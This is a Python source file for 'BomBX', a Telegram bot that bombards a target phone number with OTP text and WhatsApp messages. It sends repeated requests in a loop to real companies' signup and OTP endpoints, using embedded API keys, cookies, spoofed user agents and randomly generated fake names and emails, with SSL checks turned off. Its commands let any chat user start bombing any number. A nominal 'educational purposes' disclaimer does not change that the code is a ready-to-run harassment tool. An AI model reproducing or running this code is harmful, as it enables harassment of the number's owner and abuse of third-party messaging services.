#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Coded By Shivam Raj (@BetterCallShiv) & Adapted for Telegram Bot
# Disclaimer: This tool is for educational purposes only.
# Use it responsibly and only on phone numbers you own or have explicit permission to test.
# The developer is not responsible for any misuse of this tool.

import json
import time
import requests
import os
import copy
import signal
import sys
import random
import string
import threading
import logging
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import urllib3

# -------------------- Disable SSL warnings --------------------
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# -------------------- Configuration --------------------
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TELEGRAM_TOKEN:
    print("ERROR: TELEGRAM_BOT_TOKEN environment variable not set.")
    sys.exit(1)

# API configuration (embedded)
API_CONFIG = {
    "BomBX_API": {
        "HealthKart": {
            "type": "sms",
            "method": "GET",
            "url": "https://www.healthkart.com/veronica/user/validate/1/{phone}/signup?plt=1&st=1",
            "sleep": 20
        },
        "NNNOW": {
            "type": "sms",
            "method": "POST",
            "url": "https://api.nnnow.com/m/mobapi/otp/generateOtp/v1/flash",
            "data": {"mobileNumber": "{phone}"},
            "sleep": 20
        },
        "Shiprocket": {
            "type": "sms",
            "method": "POST",
            "url": "https://apiv2.shiprocket.in/v1/auth/login/quick",
            "data": {"mobile": "{phone}", "device_id": "LQ3.981019.001"},
            "sleep": 20
        },
        "MeeHelp": {
            "type": "sms",
            "method": "GET",
            "url": "https://meehelp.co.in/api/customer/msgDispatch?phone_number={phone}&key=AjSfg9FGDuo&API_KEY=70FF52C593B828281A",
            "headers": {
                "user-agent": "Dart/3.9 (dart:io)",
                "accept": "application/json",
                "accept-encoding": "gzip",
                "host": "meehelp.co.in"
            },
            "sleep": 20
        },
        "Nathabit_WhatsApp": {
            "type": "whatsapp",
            "method": "POST",
            "url": "https://authorize.api.nathabit.in/v2/auth/v2/app/no/opt/",
            "headers": {
                "Content-Type": "application/json",
                "Host": "authorize.api.nathabit.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.2"
            },
            "cookies": {"cust_cart": "kT7wRpLmXv3hQdNs9YeJ"},
            "data": {"phone": "{phone}", "send_on_whatsapp": True, "address_consent": True},
            "sleep": 30
        }
    }
}

# -------------------- Logging setup (file rotation) --------------------
LOG_FILE = "BomBX-Logs.txt"
MAX_LOG_SIZE = 5 * 1024 * 1024  # 5 MB

def rotate_log():
    """Rotate log file if it exceeds MAX_LOG_SIZE."""
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
        # Keep last 1000 lines
        with open(LOG_FILE, "w") as f:
            f.writelines(lines[-1000:])

# -------------------- Helper functions --------------------
def generate_random_firstname():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()

def generate_random_lastname():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()

def generate_random_email(firstname, lastname):
    domains = ["gmail.com", "yahoo.com", "outlook.com", "icloud.com"]
    return f"{firstname.lower()}{lastname.lower()}{random.randint(10, 9999)}@{random.choice(domains)}"

# -------------------- Bomber Class with Stats --------------------
class Bomber:
    def __init__(self, config_data, mode):
        self.api_data = self.load_api(config_data, mode)
        self.running = True
        # Stats: per API and totals
        self.stats = {
            "total": {"sent": 0, "success": 0, "fail": 0},
            "per_api": {}
        }
        for name in self.api_data:
            self.stats["per_api"][name] = {"sent": 0, "success": 0, "fail": 0}
        self.last_response = {name: None for name in self.api_data}  # only used for log dedup

    def load_api(self, config_data, mode):
        if "BomBX_API" not in config_data:
            raise KeyError("'BomBX_API' section missing.")
        apis = config_data["BomBX_API"]
        if mode == "sms":
            return {k: v for k, v in apis.items() if v.get("type") == "sms"}
        elif mode == "call":
            return {k: v for k, v in apis.items() if v.get("type") == "call"}
        elif mode == "whatsapp":
            return {k: v for k, v in apis.items() if v.get("type") == "whatsapp"}
        elif mode == "multi":
            return apis
        else:
            return apis

    def build_cookies(self, api, phone, firstname, lastname, fullname, email):
        raw_cookies = api.get("cookies", {})
        if isinstance(raw_cookies, dict):
            cookies = {}
            for k, v in raw_cookies.items():
                if isinstance(v, str):
                    cookies[k] = v.replace("{phone}", phone).replace("{firstname}", firstname) \
                                   .replace("{lastname}", lastname).replace("{fullname}", fullname) \
                                   .replace("{email}", email)
                else:
                    cookies[k] = v
            return cookies
        elif isinstance(raw_cookies, str) and raw_cookies.strip():
            cookie_str = raw_cookies.replace("{phone}", phone).replace("{firstname}", firstname) \
                                    .replace("{lastname}", lastname).replace("{fullname}", fullname) \
                                    .replace("{email}", email)
            cookies = {}
            for part in cookie_str.split(";"):
                part = part.strip()
                if not part or "=" not in part:
                    continue
                k, v = part.split("=", 1)
                cookies[k.strip()] = v.strip()
            return cookies
        return {}

    def send_request(self, api_name, phone):
        api = self.api_data[api_name]
        firstname = generate_random_firstname()
        lastname = generate_random_lastname()
        fullname = f"{firstname} {lastname}"
        email = generate_random_email(firstname, lastname)

        def replace_vars(s):
            if not isinstance(s, str):
                return s
            return s.replace("{phone}", phone).replace("{firstname}", firstname) \
                    .replace("{lastname}", lastname).replace("{fullname}", fullname) \
                    .replace("{email}", email)

        url = replace_vars(api["url"])
        method = api.get("method", "GET").upper()

        headers = {}
        for k, v in api.get("headers", {}).items():
            headers[k] = replace_vars(v)

        cookies = self.build_cookies(api, phone, firstname, lastname, fullname, email)

        raw_data = api.get("data", {})
        if isinstance(raw_data, dict):
            data = {}
            for k, v in raw_data.items():
                data[k] = replace_vars(v)
        elif isinstance(raw_data, str):
            data = replace_vars(raw_data)
        else:
            data = raw_data

        # Update stats
        self.stats["total"]["sent"] += 1
        self.stats["per_api"][api_name]["sent"] += 1

        try:
            if method == "GET":
                r = requests.get(url, headers=headers, cookies=cookies, timeout=10, verify=False)
            else:
                content_type = headers.get("Content-Type", "").lower()
                if "application/json" in content_type:
                    if isinstance(data, str):
                        try:
                            json_data = json.loads(data)
                            r = requests.post(url, headers=headers, cookies=cookies, json=json_data, timeout=10, verify=False)
                        except json.JSONDecodeError:
                            r = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=10, verify=False)
                    else:
                        r = requests.post(url, headers=headers, cookies=cookies, json=data, timeout=10, verify=False)
                else:
                    r = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=10, verify=False)

            success = r.status_code in range(200, 300)
            if success:
                self.stats["total"]["success"] += 1
                self.stats["per_api"][api_name]["success"] += 1
                status_str = "SUCCESS"
            else:
                self.stats["total"]["fail"] += 1
                self.stats["per_api"][api_name]["fail"] += 1
                status_str = "FAILED"

            # Log to file (only if different from last response)
            if self.last_response.get(api_name) != r.text:
                rotate_log()
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(
                        f"--- [{datetime.now().strftime('%d-%m-%Y %H:%M:%S')}] "
                        f"[{status_str}] {api_name} -> Status: {r.status_code} ---\n"
                        f"{r.text[:500]}{'... (truncated)' if len(r.text)>500 else ''}\n"
                        f"--- End Response ---\n\n"
                    )
                self.last_response[api_name] = r.text

            # Minimal console output (optional, for debugging)
            print(f"{'[SUCCESS]' if success else '[FAILED]'} {api_name} -> {r.status_code}")

        except Exception as e:
            self.stats["total"]["fail"] += 1
            self.stats["per_api"][api_name]["fail"] += 1
            print(f"[ERROR] {api_name} -> {e}")
            rotate_log()
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(
                    f"--- [{datetime.now().strftime('%d-%m-%Y %H:%M:%S')}] "
                    f"[ERROR] {api_name} -> {e}\n--- End Response ---\n\n"
                )

    def start(self, phone):
        print(f"[*] Bomber Started for {phone}")
        last_used = {name: datetime.min for name in self.api_data}
        while self.running:
            now = datetime.now()
            any_request_sent = False
            for api_name, api in self.api_data.items():
                if not self.running:
                    break
                sleep_seconds = api.get("sleep", 0)
                if (now - last_used[api_name]).total_seconds() >= sleep_seconds:
                    self.send_request(api_name, phone)
                    last_used[api_name] = datetime.now()
                    any_request_sent = True
                    time.sleep(1)  # small gap between requests
            if not any_request_sent:
                time.sleep(1)

    def stop(self):
        self.running = False

    def get_stats(self):
        """Return a formatted stats string."""
        total = self.stats["total"]
        lines = [
            f"📊 *Live Stats*\n",
            f"📱 Total requests: {total['sent']}",
            f"✅ Success: {total['success']}",
            f"❌ Failed: {total['fail']}",
            f"📈 Success rate: { (total['success']/total['sent']*100) if total['sent']>0 else 0:.1f}%\n",
            "── *Per API* ──"
        ]
        for api, s in self.stats["per_api"].items():
            lines.append(f"• {api}: sent={s['sent']}, ok={s['success']}, fail={s['fail']}")
        return "\n".join(lines)

# -------------------- Telegram Bot Handlers --------------------
active_sessions = {}  # chat_id -> {"bomber": Bomber, "thread": threading.Thread, "phone": str, "mode": str}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *BomBX Telegram Bot*\n\n"
        "I can send SMS, Call, or WhatsApp messages to a target number using multiple APIs.\n\n"
        "Commands:\n"
        "/bomb `<phone>` `[mode]` – Start bombing (mode: sms/call/whatsapp/multi, default: multi)\n"
        "/stop – Stop bombing for your session\n"
        "/status – Check current bombing status\n"
        "/stats – Show live statistics for your active session\n"
        "/help – Show this message\n\n"
        "⚠️ *Disclaimer:* Use only for educational purposes on numbers you own or have permission to test.",
        parse_mode="Markdown"
    )

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = context.args

    if not args:
        await update.message.reply_text("❌ Please provide a phone number.\nExample: `/bomb 9876543210 sms`", parse_mode="Markdown")
        return

    phone = args[0]
    mode = "multi"
    if len(args) > 1:
        mode = args[1].lower()
        if mode not in ["sms", "call", "whatsapp", "multi"]:
            await update.message.reply_text("❌ Invalid mode. Choose from: sms, call, whatsapp, multi")
            return

    if chat_id in active_sessions:
        await update.message.reply_text("⚠️ You already have an active bombing session. Use `/stop` to stop it first.", parse_mode="Markdown")
        return

    if not phone.isdigit() or len(phone) < 10:
        await update.message.reply_text("❌ Invalid phone number. Please enter a valid numeric number (e.g., 9876543210).")
        return

    try:
        bomber = Bomber(API_CONFIG, mode)
    except Exception as e:
        await update.message.reply_text(f"❌ Error initializing bomber: {e}")
        return

    if not bomber.api_data:
        await update.message.reply_text(f"❌ No APIs available for mode '{mode}'. Check configuration.")
        return

    def run_bomber():
        bomber.start(phone)
        # Cleanup after bomber finishes (e.g., if stopped naturally)
        if chat_id in active_sessions:
            del active_sessions[chat_id]
            print(f"[INFO] Session for chat {chat_id} removed after bomber finished.")

    thread = threading.Thread(target=run_bomber, daemon=True)
    thread.start()

    active_sessions[chat_id] = {
        "bomber": bomber,
        "thread": thread,
        "phone": phone,
        "mode": mode
    }

    await update.message.reply_text(
        f"✅ *Bombing started!*\n"
        f"📱 Target: `{phone}`\n"
        f"📡 Mode: `{mode}`\n"
        f"⏳ Sending requests...\n\n"
        f"Use `/stop` to stop the bombing.\n"
        f"Use `/stats` to see live progress.",
        parse_mode="Markdown"
    )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in active_sessions:
        await update.message.reply_text("ℹ️ You don't have an active bombing session.")
        return

    session = active_sessions[chat_id]
    bomber = session["bomber"]
    bomber.stop()
    # Remove from dict (thread will also remove when it ends)
    if chat_id in active_sessions:
        del active_sessions[chat_id]

    await update.message.reply_text(
        f"🛑 *Bombing stopped!*\n"
        f"📱 Target: `{session['phone']}`\n"
        f"📡 Mode: `{session['mode']}`\n"
        f"🔴 All requests halted.",
        parse_mode="Markdown"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in active_sessions:
        await update.message.reply_text("ℹ️ No active bombing session.")
        return

    session = active_sessions[chat_id]
    bomber = session["bomber"]
    running = bomber.running
    status_text = "🟢 Running" if running else "🔴 Stopped"
    total = bomber.stats["total"]
    await update.message.reply_text(
        f"📊 *Session Status*\n"
        f"📱 Target: `{session['phone']}`\n"
        f"📡 Mode: `{session['mode']}`\n"
        f"🔄 Status: {status_text}\n"
        f"📨 Requests sent: {total['sent']}\n"
        f"✅ Success: {total['success']}\n"
        f"❌ Failed: {total['fail']}",
        parse_mode="Markdown"
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in active_sessions:
        await update.message.reply_text("ℹ️ No active bombing session.")
        return

    bomber = active_sessions[chat_id]["bomber"]
    stats_text = bomber.get_stats()
    # Split if too long for Telegram (max 4096 chars)
    if len(stats_text) > 4000:
        parts = [stats_text[i:i+4000] for i in range(0, len(stats_text), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode="Markdown")
    else:
        await update.message.reply_text(stats_text, parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# -------------------- Flask Web Server --------------------
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return jsonify({"status": "Bot Running", "time": time.time()})

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

# -------------------- Main --------------------
def main():
    # Start Flask in background
    threading.Thread(target=run_flask, daemon=True).start()
    print("[INFO] Flask server started.")

    # Initialize Telegram bot
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("bomb", bomb))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("stats", stats))

    print("[INFO] Telegram bot started polling...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[INFO] Bot stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"[FATAL ERROR] {e}")
        sys.exit(1)
